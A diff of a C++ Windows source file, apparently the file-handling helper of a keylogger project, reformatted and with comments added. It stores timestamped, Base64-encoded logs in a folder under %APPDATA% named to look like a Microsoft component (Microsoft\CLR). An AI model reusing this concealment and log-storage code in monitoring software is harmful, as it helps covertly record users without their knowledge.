@@ -4,38 +4,36 @@
 #include <string>
 #include <cstdlib>
 #include <fstream>
-//Windows API
-#include "windows.h"
+#include "windows.h" // windows API
 #include "Helper.h"
 #include "Base64.h"
 
-namespace IO
-{
-    std::string GetOurPath(const bool append_seperator = false)
-    {
-        //getenv - get environment function
-        std::string appdata_dir(getenv("APPDATA"));
-        std::string full = appdata_dir + "\\Microsoft\\CLR";
+namespace IO {
+    std::string GetOurPath(const bool append_seperator = false) { // append separator = if the backslash is included at the end of our path
+
+        std::string appdata_dir(getenv("APPDATA")); // getenv - get environment function
+        std::string full = appdata_dir + "\\Microsoft\\CLR"; // backslash is an escape character so we need to write 2 to incorporate a backslash in the string
+
         return full + (append_seperator ? "\\" : "");
     }
 
-    bool MkOneDR(std::string path)
-    {
-        //always returns bool because of
-        //"(bool)"
-        return (bool)CreateDirectory(path.c_str(), NULL) ||
-        GetLastError() == ERROR_ALREADY_EXISTS;
+    bool MkOneDr(std::string path) { // this function fails in a C:\Users\User\Downloads or a C:\Users\\Downloads scenario
+
+        // always returns bool because of
+        // (bool)
+        return (bool)CreateDirectory(path.c_str(), NULL)
+        || GetLastError() == ERROR_ALREADY_EXISTS;
     }
 
-    bool MKDir(std::string path)
-    {
+    bool MKDir(std::string path) {
+
         for(char &c : path)
         {
-            if(c == '\\')
+            if(c == '\\') // like C:\Users\test\Download
             {
-                // \0 is the null terminator
+                // '\0' is the null terminator
                 c = '\0';
-                if(!MkOneDR(path))
+                if(!MkOneDr(path))
                 {
                     return false;
                 }
@@ -55,16 +53,21 @@ namespace IO
         try
         {
             std::ofstream file(path + name);
-            if(!file)
+
+            if(!file) // if file cannot be opened or used, then return an empty string
             {
                 return "";
             }
             std::ostringstream s;
-            s << "[" << dt.GetDateTimeString() << "]" <<
-            std::endl << t << std::endl;
+            s << "[" << dt.GetDateTimeString() << "]" << std::endl << t << std::endl;
+
+            // encrypt
             std::string data = Base64::EncryptB64(s.str());
+
+            // put string stream into file
             file << data;
-            if(!file)
+
+            if(!file) // if something is wrong, then return an empty string
             {
                 return "";
             }
